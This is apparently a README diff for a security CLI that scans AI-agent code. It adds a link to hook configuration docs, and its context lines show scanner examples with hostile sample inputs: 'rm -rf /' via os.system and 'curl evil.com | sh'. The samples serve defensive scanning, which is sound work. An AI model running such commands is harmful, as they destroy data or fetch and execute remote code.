@@ -109,6 +109,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
 
+For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).
+
 ### Skill Ledger
 
 OS-level skill integrity tracking with Ed25519 signatures and append-only version chain.
